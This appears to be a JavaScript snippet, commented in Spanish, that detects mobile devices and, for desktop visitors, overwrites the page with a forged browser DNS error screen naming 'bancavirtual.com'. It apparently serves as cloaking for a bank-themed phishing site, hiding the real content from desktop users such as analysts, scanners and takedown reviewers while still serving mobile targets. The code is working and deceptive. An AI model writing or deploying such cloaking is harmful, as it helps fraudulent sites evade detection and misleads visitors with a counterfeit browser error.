// Script para bloquear acceso desde computadores de escritorio
(function() {
    function isMobileDevice() {
        // Detectar por User Agent
        const userAgent = navigator.userAgent.toLowerCase();
        const mobileKeywords = ['android', 'iphone', 'ipod', 'ipad', 'blackberry', 'windows phone', 'opera mini', 'webos'];
        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
        
        // Detectar por tamaño de pantalla
        const screenWidth = window.innerWidth || screen.width;
        const isSmallScreen = screenWidth < 768;
        
        // Detectar por capacidad táctil
        const isTouchCapable = () => {
            return (('ontouchstart' in window) || 
                    (navigator.maxTouchPoints > 0) || 
                    (navigator.msMaxTouchPoints > 0));
        };
        
        return isMobileUA || (isSmallScreen && isTouchCapable());
    }

    function blockDesktop() {
        if (!isMobileDevice()) {
            document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>No se puede acceder a este sitio web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            background: #1a1a1a;
            color: #9aa0a6;
            padding: 60px 20px 20px 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        
        .icon {
            width: 140px;
            height: 140px;
            margin: 0 auto 40px;
            opacity: 0.7;
        }
        
        h1 {
            font-size: 28px;
            font-weight: 400;
            color: #e8eaed;
            margin-bottom: 20px;
            letter-spacing: -0.5px;
        }
        
        .error-message {
            font-size: 15px;
            color: #9aa0a6;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .error-message strong {
            color: #e8eaed;
            font-weight: 500;
        }
        
        .error-code {
            font-size: 13px;
            color: #80868b;
            margin-bottom: 40px;
            letter-spacing: 1px;
            font-family: 'Roboto Mono', 'Courier New', monospace;
        }
        
        .button {
            background: #8ab4f8;
            color: #202124;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .button:hover {
            background: #aecbfa;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
        }
        
        .button:active {
            background: #669df6;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="icon" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <style>
                    .st0 { fill: #63666d; }
                    .st1 { fill: #80868b; }
                </style>
            </defs>
            <!-- Icono de archivo con signo de exclamación -->
            <g transform="translate(40 40)">
                <rect class="st0" x="32" y="8" width="48" height="60" rx="3"/>
                <rect class="st1" x="44" y="4" width="24" height="4"/>
                <circle class="st0" cx="56" cy="45" r="12"/>
                <path class="st0" d="M56 40 L56 48 M56 50 L56 52"/>
            </g>
        </svg>
        
        <h1>No se puede acceder a este sitio web</h1>
        
        <div class="error-message">
            No se ha podido encontrar la dirección DNS de la página <strong>bancavirtual.com</strong>. Se está diagnosticando el problema.
        </div>
        
        <div class="error-code">
            DNS_PROBE_POSSIBLE
        </div>
        
        <button class="button">Volver a cargar</button>
    </div>
</body>
</html>
            `;
        }
    }

    // Ejecutar cuando el DOM esté listo
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', blockDesktop);
    } else {
        blockDesktop();
    }
    
    // También verificar al cambiar tamaño
    window.addEventListener('resize', function() {
        setTimeout(blockDesktop, 500);
    });
})();